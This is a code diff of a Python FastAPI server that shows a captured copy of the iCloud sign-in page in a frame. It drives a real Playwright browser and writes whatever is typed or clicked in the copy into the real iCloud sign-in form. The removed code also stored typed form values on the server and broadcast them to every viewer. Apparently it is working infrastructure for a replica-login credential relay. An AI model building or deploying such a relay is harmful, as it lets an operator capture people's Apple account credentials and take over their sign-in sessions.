@@ -1,22 +1,21 @@
 """FastAPI server on port 9002.
 
-Visiting http://localhost:9002 serves client.html. That page opens the real
-browser (icloud.com, Sign In pressed); once Sign In has been clicked, the app
-goes to a page that was captured earlier - ``src/1.html`` - as a document of
-its own, not inside a frame.
+Visiting http://localhost:9002 serves client.html: a black screen with the mark,
+and then the captured sign-in page in a frame of its own.
 
-The mirrored capture pipeline is gone. There is no agent in the real browser,
-no document stream, no resource proxy and no engine rebuilding a page from a
-capture: the captured HTML in ``src/`` *is* the page. What the server does now
-is keep every viewer of it in step, because a static file cannot:
+What the app does:
 
-* it injects ``/sync.js`` into every captured page it serves, and
-* it holds the shared state - which page everyone is on, and every form value
-  that has been typed - and relays changes over ``/ws``.
+* it opens a real browser, goes to icloud.com and presses Sign In;
+* it waits until the sign-in form is actually there - the account field - and
+  only then shows the capture;
+* it maps the capture onto that page: what is typed into the field in the
+  frame is written into the real field in the browser, and a click on Continue
+  is a click on the real Continue.
 
-So anything done in the captured page is reflected server-side: it is stored
-by the hub and handed to the next viewer (and to the next reload) instead of
-living only in one browser tab.
+There is no mirror and no capture pipeline. ``src/`` holds the HTML that was
+captured earlier, and it is served exactly as it is, byte for byte: no script
+added, no meta rewritten, no policy touched. The mapping lives in the app page
+and in this server, not in the capture.
 
     python server.py
 """
@@ -29,11 +28,12 @@ import mimetypes
 import os
 import re
 import sys
+import time
 from pathlib import Path
-from urllib.parse import quote, urlsplit
+from urllib.parse import quote
 
 from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, Response
+from fastapi.responses import FileResponse, HTMLResponse, Response
 
 HERE = Path(__file__).parent
 
@@ -65,6 +65,7 @@ state = {
     "step": "",
     "error": "",
     "browser_open": False,
+    "form_up": False,
 }
 
 # The real browser. It is opened so the user can sign in; it is not mirrored.
@@ -72,14 +73,16 @@ pw = None
 ctx = None
 page = None
 
-# What a captured page gets on the way out. None of it is written into the
-# file on disk: the file stays exactly what was captured, and these are put in
-# as it is served. There is no write path for src/ at all.
-SYNC_TAG = '<script src="/sync.js"></script>'
+# The element the capture is answering: the account field of the sign-in form.
+# iCloud renders that form inside a widget iframe, so it is looked for in every
+# frame of the browser, not just in the top document.
+ACCOUNT_FIELD = "#account_name_text_field"
 
-# A capture is served exactly as it was captured. The one thing added is this
-# tag, and only this tag. Nothing is removed, no meta is rewritten, no policy
-# is touched.
+# How long to wait for the form before showing the capture anyway.
+WAIT_FOR_FORM = 90.0
+
+# A capture is served exactly as it was captured: nothing added, nothing
+# removed, nothing rewritten. There is no write path for src/ at all.
 
 NO_STORE = {"Cache-Control": "no-store"}
 
@@ -200,15 +203,11 @@ def bring_new_tab_to_front(new_page):
 
 @app.get("/")
 async def index():
-    """The launcher, until the browser is open and Sign In has been clicked.
+    """The app: the mark, then the capture in a frame, mapped to the browser.
 
-    After that the captured page *is* the app, so this redirects to it. A
-    reload must not pretend the browser has to be opened again - and a top
-    level document means the capture is laid out as a page of its own,
-    instead of being squeezed into a frame inside another document.
+    It is the same document before and after the browser is up, so a reload is
+    just a reload: no redirect, no second window, and the frame is the capture.
     """
-    if state["status"] == "done":
-        return RedirectResponse(hub.page, status_code=307)
     # no-store, so an edit to client.html shows up on refresh instead of
     # serving the browser's cached copy.
     return FileResponse(HERE / "client.html", headers=NO_STORE)
@@ -223,7 +222,7 @@ async def start():
         log(f"/start ignored, already {state['status']}")
         return state
 
-    state.update(status="running", error="", browser_open=False)
+    state.update(status="running", error="", browser_open=False, form_up=False)
 
     try:
         # Imported here rather than at module load: serving the captured pages
@@ -254,8 +253,16 @@ async def start():
         log("clicking Sign In")
         await page.locator(SIGNIN_BUTTON).first.click(timeout=15000)
 
+        # The capture is the sign-in screen, so it is shown once the real one
+        # is on screen - not on a timer.
+        log(f"waiting for {ACCOUNT_FIELD} in the browser")
+        if await wait_for_form(ACCOUNT_FIELD):
+            state["form_up"] = True
+            log("the sign-in form is up")
+        else:
+            log("the sign-in form did not appear - showing the capture anyway")
+
         state["status"] = "done"
-        log("done - sign in yourself in the browser window")
 
     except Exception as exc:
         state["status"] = "error"
@@ -267,7 +274,7 @@ async def start():
 
 @app.get("/status")
 async def status():
-    return {**state, "page": hub.page}
+    return {**state, "page": START_PAGE}
 
 
 # --------------------------------------------------------------------------
@@ -275,84 +282,11 @@ async def status():
 #
 # src/ is served as it is. The file on disk is never written to, and the
 # document is not rewritten: scripts, styles, metas, policy and markup all go
-# out as they came in. The one addition is /sync.js, so the page reports what
-# is done to it to the server.
-#
-# The tag goes in once: before </head>, or after <body> when the capture has
-# no head, or at the top when it has neither.
+# out as they came in. What the app does with the page happens in the app page
+# and in this server, never in the capture.
 # --------------------------------------------------------------------------
 
-_SYNC_PRESENT = re.compile(r"""<script\b[^>]*\bsrc\s*=\s*["']?/sync\.js""", re.IGNORECASE)
 _HTML_SUFFIXES = (".html", ".htm")
-
-
-def _insert_point(page_html: str) -> int | None:
-    """Where the engine tag goes: before </head>, else after <body>, else None.
-
-    Tags inside a quoted attribute value are skipped. SingleFile captures keep
-    a whole nested document in an <iframe srcdoc="..."> attribute, so their
-    first </head> belongs to that inner document, not to the page: dropping a
-    tag there would end the attribute early and cut the frame open.
-    """
-    size = len(page_html)
-    i = 0
-    while i < size:
-        i = page_html.find("<", i)
-        if i < 0:
-            return None
-
-        if page_html.startswith("<!--", i):
-            end = page_html.find("-->", i + 4)
-            if end < 0:
-                return None
-            i = end + 3
-            continue
-
-        j = i + 1
-        closing = page_html.startswith("/", j)
-        if closing:
-            j += 1
-
-        name_at = j
-        while j < size and page_html[j] not in " \t\r\n/>":
-            j += 1
-        name = page_html[name_at:j].lower()
-
-        # Walk to the end of the tag, stepping over quoted attribute values.
-        k = j
-        while k < size:
-            char = page_html[k]
-            if char in "\"'":
-                k = page_html.find(char, k + 1)
-                if k < 0:
-                    return None
-                k += 1
-                continue
-            if char == ">":
-                break
-            k += 1
-        if k >= size:
-            return None
-
-        if closing and name == "head":
-            return i
-        if not closing and name == "body":
-            return k + 1
-
-        i = k + 1
-
-    return None
-
-
-def with_engine(page_html: str) -> str:
-    """The capture with the sync engine in it, and nothing else changed."""
-    if _SYNC_PRESENT.search(page_html):
-        return page_html
-
-    at = _insert_point(page_html)
-    if at is None:
-        return SYNC_TAG + page_html
-    return page_html[:at] + SYNC_TAG + page_html[at:]
 
 
 def captured_files(folder: Path) -> list[Path]:
@@ -410,9 +344,10 @@ def page_document(title: str, body: str) -> str:
 def listing_page(folder: Path) -> str:
     body = (
         "<h1>Captured pages</h1>"
-        "<p>The app opens <code>1.html</code> once the browser is up. Every "
-        "page here runs <code>/sync.js</code>, so what you type and click is "
-        "reflected server-side and follows you between viewers.</p>"
+        "<p>The app opens <code>1.html</code> in a frame once the browser has "
+        "the sign-in form. Each file is served exactly as it was captured; "
+        "what is typed into it is written into the real page in the browser "
+        "window.</p>"
         + page_links(folder)
     )
     return page_document("Captured pages", body)
@@ -424,9 +359,10 @@ def missing_page(path: str, folder: Path) -> str:
     )
     body = (
         f"<h1>Nothing captured at {where} yet</h1>"
-        "<p>This route serves the HTML files that were captured earlier. Drop "
-        "the capture into <code>src/</code> - starting with <code>1.html</code> "
-        "- and reload.</p>"
+        "<p>This route serves the HTML files that were captured earlier, byte "
+        "for byte, along with any images or stylesheets next to them. Drop the "
+        "capture into <code>src/</code> - starting with <code>1.html</code> - "
+        "and reload.</p>"
         + page_links(folder)
     )
     return page_document("No captured page", body)
@@ -435,7 +371,7 @@ def missing_page(path: str, folder: Path) -> str:
 @app.get("/src")
 @app.get("/src/{path:path}")
 async def captured(path: str = ""):
-    """Serve a captured page (with the sync engine) or one of its assets."""
+    """Serve a captured page, or one of its images, exactly as it is."""
     folder = SRC
     path = path.lstrip("/")
 
@@ -458,8 +394,12 @@ async def captured(path: str = ""):
         return HTMLResponse(missing_page(path, folder), status_code=404)
 
     if target.suffix.lower() in _HTML_SUFFIXES:
-        source = target.read_text(encoding="utf-8", errors="replace")
-        return HTMLResponse(with_engine(source), headers=NO_STORE)
+        # The file, byte for byte.
+        return Response(
+            content=target.read_bytes(),
+            media_type="text/html",
+            headers=NO_STORE,
+        )
 
     media_type = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
     return Response(
@@ -469,208 +409,143 @@ async def captured(path: str = ""):
     )
 
 
-@app.get("/sync.js")
-async def sync_js():
-    """The engine that runs inside every captured page."""
+@app.get("/map.js")
+async def map_js():
+    """The bridge the app page runs: it watches the frame, not the capture."""
     return FileResponse(
-        HERE / "sync.js",
+        HERE / "map.js",
         media_type="text/javascript",
         headers=NO_STORE,
     )
 
 
 # --------------------------------------------------------------------------
-# Live sync
+# Mapping the capture onto the browser
 #
-# The captured page is a file, so nothing in it can know what anyone else is
-# doing. The server is the shared state instead: which page is on screen, and
-# every form value that has been typed into it. A viewer that connects is given
-# that state; changes are broadcast to the other viewers; a click is relayed as
-# a marker rather than replayed, because replaying it would press the button a
-# second time.
+# The capture is a copy of the sign-in screen; the real one is in the browser
+# window. What is typed into the copy is written into the real page - the same
+# element id, in whichever frame of the browser has it - so the two screens say
+# the same thing.
+#
+# Nothing is injected into the capture to do this. It is shown in a frame of
+# the app page, which is ours, so that page watches the field and posts what
+# changed here; this side does the writing.
 # --------------------------------------------------------------------------
 
-def clean_page(value) -> str:
-    """A page we are willing to send a viewer to: inside /src/, and HTML."""
-    if not isinstance(value, str):
-        return ""
-    if not value.startswith("/src/") or ".." in value:
-        return ""
-    if not value.lower().endswith(_HTML_SUFFIXES):
-        return ""
-    return value
+_FIELD_ID = re.compile(r"^[A-Za-z][\w-]{0,80}$")
+
+_FIND = "(sel) => !!document.querySelector(sel)"
+
+# Written through the prototype setter, then announced with input and change:
+# the widget's framework listens for those events and ignores a plain
+# assignment, so `el.value = x` alone would leave the page looking empty.
+_SET = """([sel, value]) => {
+  const el = document.querySelector(sel);
+  if (!el) return false;
+  const proto = el.tagName === 'TEXTAREA' ? HTMLTextAreaElement : HTMLInputElement;
+  const setter = Object.getOwnPropertyDescriptor(proto.prototype, 'value').set;
+  setter.call(el, value);
+  el.dispatchEvent(new Event('input', { bubbles: true }));
+  el.dispatchEvent(new Event('change', { bubbles: true }));
+  return true;
+}"""
+
+_CLICK = """(sel) => {
+  const el = document.querySelector(sel);
+  if (!el) return false;
+  el.click();
+  return true;
+}"""
 
 
-def came_from_a_capture(referrer) -> bool:
-    """Was this document reached from another captured page?
+def field_selector(field) -> str:
+    """What a field in the capture maps to in the real page.
 
-    A viewer that has just loaded ``/src/2.html`` from a link on ``/src/1.html``
-    is following a link, and the page it came from says so. A viewer that has
-    just opened the app has the parent page as its referrer, and is not.
+    The captures were taken from the real page and kept its ids, so a field
+    maps to the element with the same id. That is the whole mapping.
     """
-    if not isinstance(referrer, str) or not referrer:
-        return False
-    try:
-        path = urlsplit(referrer).path
-    except ValueError:
-        return False
-    return path.startswith("/src/") and path.lower().endswith(_HTML_SUFFIXES)
+    if not isinstance(field, str) or not _FIELD_ID.match(field):
+        return ""
+    return "#" + field
 
 
-class Viewer:
-    """One browser tab watching a captured page.
+def live_frames() -> list:
+    """Every frame of every page the browser has open.
 
-    Messages go through a queue so a viewer that has stopped reading cannot
-    block the others: it misses a keystroke rather than stalling the page.
+    The sign-in form is not in icloud.com's own document - it is a widget
+    iframe - and the sign-in flow may open a tab of its own, so neither the
+    top document nor the first page is necessarily where the field is.
     """
-
-    def __init__(self, websocket: WebSocket):
-        self.websocket = websocket
-        self.queue: asyncio.Queue = asyncio.Queue(maxsize=200)
-        self.task = asyncio.create_task(self._pump())
-
-    async def _pump(self):
-        while True:
-            message = await self.queue.get()
-            await self.websocket.send_json(message)
-
-    def send(self, message: dict) -> None:
+    pages = list(ctx.pages) if ctx is not None else ([page] if page is not None else [])
+    frames = []
+    for browser_page in pages:
         try:
-            self.queue.put_nowait(message)
-        except asyncio.QueueFull:
-            pass
-
-    def close(self) -> None:
-        self.task.cancel()
+            frames.extend(browser_page.frames)
+        except Exception:
+            continue
+    return frames
 
 
-class Hub:
-    """The page everyone is on, and what has been done to it."""
-
-    def __init__(self):
-        self.viewers: set[Viewer] = set()
-        self.page = START_PAGE
-        self.values: dict[str, dict] = {}
-
-    def snapshot(self) -> dict:
-        # A copy: the message sits in a queue, and a navigation in the meantime
-        # must not empty the values the viewer was promised.
-        return {
-            "t": "state",
-            "page": self.page,
-            "values": {key: dict(entry) for key, entry in self.values.items()},
-        }
-
-    def join(self, viewer: Viewer) -> None:
-        self.viewers.add(viewer)
-        viewer.send(self.snapshot())
-
-    def leave(self, viewer: Viewer) -> None:
-        self.viewers.discard(viewer)
-        viewer.close()
-
-    def broadcast(self, message: dict, sender: Viewer | None = None) -> None:
-        for viewer in list(self.viewers):
-            if viewer is not sender:
-                viewer.send(message)
-
-    def navigate(self, page, sender: Viewer | None = None) -> bool:
-        """Follow the viewer that moved to another captured page."""
-        page = clean_page(page)
-        if not page or page == self.page:
-            return False
-        self.page = page
-        # Form values belong to the page they were typed on.
-        self.values = {}
-        log(f"page: {page}")
-        self.broadcast({"t": "nav", "page": page}, sender=sender)
-        return True
-
-    def handle(self, viewer: Viewer, message) -> None:
-        if not isinstance(message, dict):
-            return
-
-        kind = message.get("t")
-
-        if kind == "hello":
-            # A viewer that has just loaded asks what it should be showing.
-            # If it got there by following a link, that is a navigation - the
-            # beacon may have been lost on the way - so the hub follows it.
-            if came_from_a_capture(message.get("from")):
-                self.navigate(message.get("page"), sender=viewer)
-            viewer.send(self.snapshot())
-
-        elif kind == "nav":
-            self.navigate(message.get("page"), sender=viewer)
-
-        elif kind == "value":
-            key = message.get("key")
-            if not isinstance(key, str) or not key or len(key) > 2000:
-                return
-            raw_value = message.get("value")
-            entry = {
-                "value": raw_value[:10000] if isinstance(raw_value, str) else "",
-                "checked": bool(message.get("checked")),
-            }
-            self.values[key] = entry
-            self.broadcast({"t": "value", "key": key, **entry}, sender=viewer)
-
-        elif kind == "click":
-            x, y = message.get("x"), message.get("y")
-            if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
-                return
-            self.broadcast(
-                {
-                    "t": "click",
-                    "key": str(message.get("key") or "")[:2000],
-                    "x": x,
-                    "y": y,
-                },
-                sender=viewer,
-            )
+async def in_frames(script: str, argument) -> bool:
+    """Run a script in each frame until one of them answers True."""
+    for frame in live_frames():
+        try:
+            if await frame.evaluate(script, argument):
+                return True
+        except Exception:
+            # A frame that is navigating, detached or crashed is not an error
+            # worth passing on: the field is somewhere, and the next frame
+            # may be where it is.
+            continue
+    return False
 
 
-hub = Hub()
+async def field_is_there(selector: str) -> bool:
+    return await in_frames(_FIND, selector)
 
 
-async def sync_socket(websocket: WebSocket):
-    """The captured page's line to the server."""
-    await websocket.accept()
-    viewer = Viewer(websocket)
-    hub.join(viewer)
-
-    try:
-        while True:
-            raw = await websocket.receive_text()
-            try:
-                message = json.loads(raw)
-            except json.JSONDecodeError:
-                continue
-            hub.handle(viewer, message)
-    except WebSocketDisconnect:
-        pass
-    except Exception as exc:
-        log(f"viewer disconnected: {str(exc).splitlines()[0]}")
-    finally:
-        hub.leave(viewer)
+async def write_field(selector: str, value: str) -> bool:
+    return await in_frames(_SET, [selector, value])
 
 
-app.websocket("/ws")(sync_socket)
+async def click_field(selector: str) -> bool:
+    return await in_frames(_CLICK, selector)
 
 
-@app.post("/nav")
-async def nav(request: Request):
-    """A link click, reported by ``sendBeacon`` as the page unloads.
+async def wait_for_form(selector: str, timeout: float = WAIT_FOR_FORM) -> bool:
+    """Wait until the sign-in form is on screen in the real browser."""
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        if await field_is_there(selector):
+            return True
+        await asyncio.sleep(0.3)
+    return False
 
-    Waiting for the WebSocket to carry it would race the navigation; a beacon
-    is delivered whether or not the document survives.
-    """
+
+@app.post("/map")
+async def map_to_browser(request: Request):
+    """One thing done in the capture, written into the real page."""
     try:
         message = json.loads(await request.body() or b"{}")
-    except json.JSONDecodeError:
+    except (json.JSONDecodeError, UnicodeDecodeError):
         return Response(status_code=400)
-    hub.navigate(message.get("page") if isinstance(message, dict) else None)
-    return Response(status_code=204)
+
+    if not isinstance(message, dict):
+        return Response(status_code=400)
+
+    selector = field_selector(message.get("field"))
+    if not selector:
+        return Response(status_code=400)
+
+    if message.get("click"):
+        mapped = await click_field(selector)
+    else:
+        value = message.get("value")
+        mapped = await write_field(
+            selector, value[:10000] if isinstance(value, str) else ""
+        )
+
+    return {"ok": mapped, "field": selector[1:]}
 
 
 @app.get("/.well-known/appspecific/com.chrome.devtools.json")
